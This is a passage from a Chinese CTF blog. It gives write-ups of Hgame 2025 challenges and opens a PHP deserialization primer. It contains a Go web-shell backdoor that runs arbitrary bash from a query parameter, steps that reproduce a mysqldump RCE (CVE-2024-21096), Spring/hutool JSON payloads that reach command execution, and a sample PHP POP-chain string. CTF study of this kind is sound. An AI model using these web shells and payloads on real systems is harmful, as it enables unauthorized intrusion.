href="https://baimeow.cn/posts/ctf/d3go/">提示</a>结合对 overseer 的搜索可以发现使用了 overseer 对程序热加载，文件变更后会自动重启更新，解题思路也就是从自更新入手打 RCE。</p><p>那么先在本地修改 main.go 文件，注释掉原有的静态⽂件托管，写入 WP 所给后门</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">program</span><span class="hljs-params">(state overseer.State)</span></span> &#123;<br>        g := gin.Default()<br>        <span class="hljs-comment">// g.StaticFS(&quot;/&quot;, gin.Dir(&quot;.&quot;, true))</span><br>        g.GET(<span class="hljs-string">&quot;/shell&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>                cmd, _ := c.GetQuery(<span class="hljs-string">&quot;cmd&quot;</span>)<br>                out, err := exec.Command(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd).CombinedOutput()<br>                <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>                        c.String(<span class="hljs-number">500</span>, err.Error())<br>                        <span class="hljs-keyword">return</span><br>                &#125;<br>                c.String(<span class="hljs-number">200</span>, <span class="hljs-type">string</span>(out))<br>        &#125;)<br>        g.Run(<span class="hljs-string">&quot;:8080&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>然后使用 <code>go build -o update</code> 编译文件为 update（源文件名）</p><p>再上传覆盖原文件 <code>mc cp ./update ctf-minio/prodbucket/update</code></p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/QpU4boPRwoAChXxDxCKcqBfende.png"></p><p>等自更新完成后向靶机发送 get 请求 RCE，得到 flag（题目给的第二个地址）</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/Nf5Ub89nuodHNuxfPQ8cwEpdnEh.png"></p><p>参考：<a href="https://infernity.top/2025/02/03/Hgame-2025-week1/#Level-25-%E5%8F%8C%E9%9D%A2%E4%BA%BA%E6%B4%BE%E5%AF%B9">https://infernity.top/2025/02/03/Hgame-2025-week1/#Level-25-%E5%8F%8C%E9%9D%A2%E4%BA%BA%E6%B4%BE%E5%AF%B9</a></p><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="Level-21096-HoneyPot-Revenge"><a href="#Level-21096-HoneyPot-Revenge" class="headerlink" title="Level 21096 HoneyPot_Revenge"></a>Level 21096 HoneyPot_Revenge</h3><p>比赛时针对 mysqldump 尝试用网上找到的 mysql 协议伪造程序解题，但未能成功，也没有关注到 CVE-2024-21096 漏洞，看 WP 后问题确实在 mysqldump 上</p><p>参考 WP 和博客 <a href="https://tech.ec3o.fun/2024/10/25/Web-Vulnerability%20Reproduction/CVE-2024-21096/">https://tech.ec3o.fun/2024/10/25/Web-Vulnerability%20Reproduction/CVE-2024-21096/</a> 自行编译一个 mysql 服务进行复现：</p><p>先搭安装编译依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get update<br>sudo apt-get install -y build-essential cmake bison libncurses5-dev libtirpc-dev libssl-dev pkg-config<br>wget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-boost-8.0.34.tar.gz<br>tar -zxvf mysql-boost-8.0.34.tar.gz<br>cd mysql-8.0.34<br></code></pre></td></tr></table></figure><p>然后在 <code>mysql-8.0.34/include</code> 目录下找到 <code>mysql_version.h.in</code> 版本模板文件如下，对其进行修改</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">/* Copyright Abandoned 1996,1999 TCX DataKonsult AB &amp; Monty Program KB</span><br><span class="hljs-comment">   &amp; Detron HB, 1996, 1999-2004, 2007 MySQL AB.</span><br><span class="hljs-comment">   This file is public domain and comes with NO WARRANTY of any kind</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/* Version numbers for protocol &amp; mysqld */</span><br><br>#ifndef _mysql_version_h<br>#<span class="hljs-keyword">define</span> _mysql_version_h<br><br>#<span class="hljs-keyword">define</span> PROTOCOL_VERSION            <span class="hljs-variable">@PROTOCOL_VERSION</span>@<br>#<span class="hljs-keyword">define</span> MYSQL_SERVER_VERSION       &quot;@VERSION@&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_BASE_VERSION         &quot;mysqld-@MYSQL_BASE_VERSION@&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_SERVER_SUFFIX_DEF    &quot;@MYSQL_SERVER_SUFFIX@&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_VERSION_ID            <span class="hljs-variable">@MYSQL_VERSION_ID</span>@<br>#<span class="hljs-keyword">define</span> MYSQL_PORT                  <span class="hljs-variable">@MYSQL_TCP_PORT</span>@<br>#<span class="hljs-keyword">define</span> MYSQL_ADMIN_PORT            <span class="hljs-variable">@MYSQL_ADMIN_TCP_PORT</span>@<br>#<span class="hljs-keyword">define</span> MYSQL_PORT_DEFAULT          <span class="hljs-variable">@MYSQL_TCP_PORT_DEFAULT</span>@<br>#<span class="hljs-keyword">define</span> MYSQL_UNIX_ADDR            &quot;@MYSQL_UNIX_ADDR@&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_CONFIG_NAME          &quot;my&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_PERSIST_CONFIG_NAME  &quot;mysqld-auto&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_COMPILATION_COMMENT  &quot;@COMPILATION_COMMENT@&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_COMPILATION_COMMENT_SERVER  &quot;@COMPILATION_COMMENT_SERVER@&quot;<br>#<span class="hljs-keyword">define</span> LIBMYSQL_VERSION           &quot;@VERSION@&quot;<br>#<span class="hljs-keyword">define</span> LIBMYSQL_VERSION_ID         <span class="hljs-variable">@MYSQL_VERSION_ID</span>@<br><br>#ifndef LICENSE<br>#<span class="hljs-keyword">define</span> LICENSE                     GPL<br>#endif <span class="hljs-comment">/* LICENSE */</span><br><br>#endif <span class="hljs-comment">/* _mysql_version_h */</span><br></code></pre></td></tr></table></figure><p>修改该处即可 <code>#define MYSQL_SERVER_VERSION       &quot;@VERSION@&quot;</code></p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/AnMzbnkRcoHVpGxrVsIcVXzKnoh.png"></p><p>编译（很久，所以上一步修改需谨慎）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir build     //在刚才的mysql目录下<br>cd build<br>cmake .. -DDOWNLOAD_BOOST=1 -DWITH_BOOST=../boost<br>make -j$(nproc)<br></code></pre></td></tr></table></figure><p>安装 MySQL <code>sudo make install</code></p><p>创建⽤⼾组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo groupadd mysql <br>sudo useradd -r -g mysql -s /bin/false mysql<br></code></pre></td></tr></table></figure><p>数据库初始化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo /usr/local/mysql/bin/mysqld --initialize --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data<br></code></pre></td></tr></table></figure><p>并获得初始账号密码</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/SANWbY4RsoYGGJxvcKUcafWtnrd.png"></p><p>设置⽬录权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo chown -R mysql:mysql /usr/local/mysql <br>sudo chown -R mysql:mysql /usr/local/mysql/data<br></code></pre></td></tr></table></figure><p>启动服务、使⽤记录的 root 密码登录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo /usr/local/mysql/bin/mysqld_safe --user=mysql &amp;<br>/usr/local/mysql/bin/mysql -u root -p<br></code></pre></td></tr></table></figure><p>重置密码并创建 test 库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;password&#x27;</span>; <br>FLUSH PRIVILEGES; <br><span class="hljs-keyword">CREATE</span> DATABASE test;<br></code></pre></td></tr></table></figure><p>配置远程连接登录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">use mysql;<br><span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> host <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;root&#x27;</span>;    ##改为<span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-string">&#x27;%&#x27;</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span>允许任何ip访问<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,host <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;    ## 查看用户访问端口如下<br>FLUSH PRIVILEGES;    ## 刷新服务配置项<br>EXIT;<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/X79hbhJtZoMoFcxJia4cGV1Tngg.png"></p><p>查看 mysqldump 版本测试 <code>/usr/local/mysql/bin/mysql --version</code>，可以看到插入的命令</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/O07ab350LoC8euxB8VycO1hLnhf.png"></p><p>虚拟机配置桥接模式，与服务器通过 ssh 反向隧道构建端口映射</p><p>虚拟机上输入</p><p><code>sudo ssh -fN -R （服务器端口）3306:localhost:3306（虚拟机端口） 服务器登录账户名@服务器公网ip</code></p><p>虚拟机上可使用 <code>ps aux | grep &quot;ssh -NfR&quot;</code> 查看连接情况</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/KwjpbrjtmoAe6UxLaYHc0BwJnBh.png"></p><p>服务器上输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/ssh/sshd_config   #修改配置加上GatewayPorts yes语句允许反向隧道<br>sudo systemctl restart sshd   #重启 SSH 服务<br>ps aux | grep ssh    #查看SSH隧道状态<br></code></pre></td></tr></table></figure><p>用主机尝试通过服务器 ip 登录 mysql，登录成功</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/FiYabpnbZoZL0FxZ8kucxrdsnsb.png"></p><p>导入靶机数据库</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/AwSJbc2CyogwkVxaKllconORnjd.png"></p><p>访问 <code>/flag</code>，发现成功 RCE，获得 flag</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/JZ5Ib5RCwo2F7VxYyOGcM0gsnlb.png"></p><p>参考：</p><p><a href="https://fanllspd.com/posts/cf41815c/#Level-21096-HoneyPot-Revenge">https://fanllspd.com/posts/cf41815c/#Level-21096-HoneyPot-Revenge</a></p><p><a href="https://tech.ec3o.fun/2024/10/25/Web-Vulnerability">https://tech.ec3o.fun/2024/10/25/Web-Vulnerability%20Reproduction/CVE-2024-21096/</a></p><p><a href="https://blog.csdn.net/INSBUG/article/details/142262709">https://blog.csdn.net/INSBUG/article/details/142262709</a></p><h3 id="Level-60-SignInJava"><a href="#Level-60-SignInJava" class="headerlink" title="Level 60 SignInJava"></a>Level 60 SignInJava</h3><p>赛时没做，现在再看看题目。下载附件，里面一个 SigninJava.jar，在 idea 里 Add as Library 添加为库即可查看源码（jar 文件当做压缩包即可），打开后文件结构如下，应该是用了 spring 框架 MVC 模式</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/DaIabKNmZoAX7sx9WGwcb1e0nVg.png"></p><p>其中 BaseResponse 规定了返回内容的格式，APIGatewayController 作为控制层规定了路由接口和接受请求后控制、调用的规则，HelloService 和 FlagTestService 处理逻辑业务，分别返回“hello xxx”和读取&#x2F;flag，InvokeUtils 和 SpringContextHolder 作为工具或插件，前者可以调用指定 bean 和其指定方法并传入参数，后者可以方便地引用各种 bean 而不需要注入。</p><p>重点看 APIGatewayController 代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> icu.Liki4.signin.controller;<br><br><span class="hljs-keyword">import</span> cn.hutool.core.util.StrUtil;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSON;<br><span class="hljs-keyword">import</span> icu.Liki4.signin.base.BaseResponse;<br><span class="hljs-keyword">import</span> icu.Liki4.signin.util.InvokeUtils;<br><span class="hljs-keyword">import</span> jakarta.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Objects;<br><span class="hljs-keyword">import</span> org.apache.commons.io.IOUtils;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&#123;&quot;/api&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">APIGatewayController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">APIGatewayController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(</span><br><span class="hljs-meta">        value = &#123;&quot;/gateway&quot;&#125;,</span><br><span class="hljs-meta">        method = &#123;RequestMethod.POST&#125;</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> BaseResponse <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> IOUtils.toString(request.getReader());<br>            Map&lt;String, Object&gt; map = (Map)JSON.parseObject(body, Map.class);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">beanName</span> <span class="hljs-operator">=</span> (String)map.get(<span class="hljs-string">&quot;beanName&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> (String)map.get(<span class="hljs-string">&quot;methodName&quot;</span>);<br>            Map&lt;String, Object&gt; params = (Map)map.get(<span class="hljs-string">&quot;params&quot;</span>);<br>            <span class="hljs-keyword">if</span> (StrUtil.containsAnyIgnoreCase(beanName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CharSequence</span>[]&#123;<span class="hljs-string">&quot;flag&quot;</span>&#125;)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BaseResponse</span>(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;flagTestService offline&quot;</span>, (Object)<span class="hljs-literal">null</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> InvokeUtils.invokeBeanMethod(beanName, methodName, params);<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BaseResponse</span>(<span class="hljs-number">200</span>, (String)<span class="hljs-literal">null</span>, result);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br>            <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var8;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BaseResponse</span>(<span class="hljs-number">500</span>, ((Throwable)Objects._requireNonNullElse_(e.getCause(), e)).getMessage(), (Object)<span class="hljs-literal">null</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>只开放了 <code>/api/gateway</code>，可以通过 post 方法 json 格式传递 <code>beanName</code>、<code>methodName</code>、<code>params</code>（Map 类型）三个参数，其中 <code>StrUtil.containsAnyIgnoreCase</code> 对 <code>beanName</code> 字符串检测是否含有 flag（不区分大小写，均过滤），若有则返回 <code>&quot;flagTestService offline&quot;</code>，若无则调用对应的 bean 中的方法，返回结果。</p><p>为了尝试调用 bean 先去了解了一下 Spring 注解自动生成的 Bean 的 name 属性命名规则，在类上加 <code>@``Component</code>、<code>@Repository</code>、<code>@Service</code>、<code>@Controller</code> 注解来定义 bean 时 spring 会自动生成 bean，如果不主动定义 bean 的 name 那么默认以类名称的首字母小写作为 bean 的 name 属性。例如 HelloService 类的 bean 就是 helloService。</p><p>尝试，得到预期返回</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/JFunbdQNBofvZJxJnIvcy1Qqnyg.png"></p><p>尝试调用 flagTestService 未能找到过滤绕过方法</p><p>于是尝试利用 SpringContextHolder，但只能获取实例，无法调用方法获取 flag</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/GOcibFNKUoAWUsxkJxAcNwgTnkd.png"></p><p>后面找不到可行的思路了，开始借鉴网上的博客和 WP，需要寻找其他 bean 可利用的类，然而我不知道他们是如何筛选出目标来的，只知道最终找到的是 hutool 的 RuntimeUtil 具有命令执行的方法，然而该类并没有被注册，所以命令执行前需要先用 hutool 里的注册 bean 的方法。（或许还与反序列化有关？此处并未搞懂）</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/AANIbGG8nonCiCxqc8ncKEC1n1f.png"></p><p>通过 hutool 的 SpringUtil 注册 hutool 的 RuntimeUtil</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-string">&quot;beanName&quot;</span>:<span class="hljs-string">&quot;cn.hutool.extra.spring.SpringUtil&quot;</span>,<br>    <span class="hljs-string">&quot;methodName&quot;</span>:<span class="hljs-string">&quot;registerBean&quot;</span>,<br>    <span class="hljs-string">&quot;params&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;arg0&quot;</span>:<span class="hljs-string">&quot;execCmd&quot;</span>,<br>        <span class="hljs-string">&quot;arg1&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;cn.hutool.core.util.RuntimeUtil&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/Ez63bk1KioiOqOxZ7ajcgtAvnEd.png"></p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/HUxQb0lwOo0cQjx06Kpca5WanZb.png"></p><p>调用 RuntimeUtil 的 execForStr 实现 RCE 获得 flag</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>    <span class="hljs-string">&quot;beanName&quot;</span>:<span class="hljs-string">&quot;execCmd&quot;</span>,<br>    <span class="hljs-string">&quot;methodName&quot;</span>:<span class="hljs-string">&quot;execForStr&quot;</span>,<br>    <span class="hljs-string">&quot;params&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;arg0&quot;</span>:<span class="hljs-string">&quot;utf-8&quot;</span>,<br>        <span class="hljs-string">&quot;arg1&quot;</span>:[<span class="hljs-string">&quot;/readflag&quot;</span>]<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/PcAvbbEvXoBox9xRYWmcRUlHnSK.png"></p><p>参考：<a href="https://www.n0o0b.com/archives/hgame2025-week2#level-60-signinjava">https://www.n0o0b.com/archives/hgame2025-week2#level-60-signinjava</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Computer-cleaner-plus"><a href="#Computer-cleaner-plus" class="headerlink" title="Computer cleaner plus"></a>Computer cleaner plus</h3><p>尝试过检索所有可执行文件、关键目录的查找、按关键字检索、alias 别名、查看进程、启动项、历史命令等等，但未找到恶意可执行文件。</p><p>官方 WP 给出的是 <code>rpm -Vf /usr/bin/*</code>，该指令可以用 rpm 验证 <code>/usr/bin/</code> 目录下所有文件所属的 RPM 软件包是否被修改，我去执行后可以发现 ps 相关内容经过修改</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/Ua8AbUFeso2cndxKo0fcaHJMnHb.png"></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs excel">各字母含义如下：<br>S         文件大小是否改变<br>M         文件的类型或文件的权限（rwx）是否被改变<br><span class="hljs-number">5</span>         文件<span class="hljs-symbol">MD5</span>校验是否改变（可以看成文件内容是否改变）<br>D         设备中，从代码是否改变<br>L         文件路径是否改变<br>U         文件的属主（所有者）是否改变<br>G         文件的属组是否改变<br><span class="hljs-built_in">T</span>         文件的修改时间是否改变<br></code></pre></td></tr></table></figure><p>说明 ps 文件的大小、权限、内容、修改时间均发生变化，下面还有多处</p><p>所以查看 ps 文件，发现可疑 elf 文件即为 flag</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/QJxWbFdjSoHCjFxDST7c0zJVnKb.png"></p><p>这里修改后的命令运行了后门程序 <code>B4ck_D0_oR.elf</code>，然后调用 <code>/.hide_command</code> 下的 ps 命令，再过滤了包含 <code>shell</code> 和 <code>B4ck_D0_oR</code> 的相关内容。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>misc</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化小结</title>
    <link href="/2025/02/01/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/"/>
    <url>/2025/02/01/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化小结"><a href="#PHP反序列化小结" class="headerlink" title="PHP反序列化小结"></a>PHP反序列化小结</h1><h1 id="什么是序列化与反序列化"><a href="#什么是序列化与反序列化" class="headerlink" title="什么是序列化与反序列化"></a>什么是序列化与反序列化</h1><p>首先，序列化是将对象转化为可存储或传输的字符串格式的过程。在 php 中，可以使用 serialize()函数将对象，数组或其它数据类型序列化称为一个字符串，以便将其保存到文件或者进行网络传输。</p><p>反序列化则是将之前序列化得到的字符串重新转换为原始的 php 数据结构或对象的过程。在 php 中，可以使用 unserialize()函数对序列化后的字符串进行反序列化操作。</p><p>如下即为某个对象序列化后的字符串样式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;_0rays&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;jbn&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpinfo&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pankas&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;lets&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;mak4r1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;asc&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ech0&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;rocket&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;lets&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;mak4r1&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ech0&quot;</span>;O:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;go&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;ed_xinhu&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;lets&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;mak4r1&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ech0&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;rocket&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errmis&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;rocket&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errmis&quot;</span>;N;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errmis&quot;</span>;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p>序列化的意义主要在于方便数据的存储和传输。</p><h1 id="反序列化漏洞的产生、利用原理"><a href="#反序列化漏洞的产生、利用原理" class="headerlink" title="反序列化漏洞的产生、利用原理"></a>反序列化漏洞的产生、利用原理</h1><p>反序列化漏洞的产生主要因为存在一些含魔术方法的可利用的类、用户可控的参数，通过设计各个类的属性参数，实现反序列化时各个魔术方法的自动（连锁）调用从而执行目的操作。目前我所接触到的一般的 PHP 反序列化漏洞通常搭配文件上传，服务器接收序列化的文件后我们通过一些操作让服务器对其进行反序列化处理。</p><h1 id="魔术方法"><a href="#魔术方法" class="headerlink" 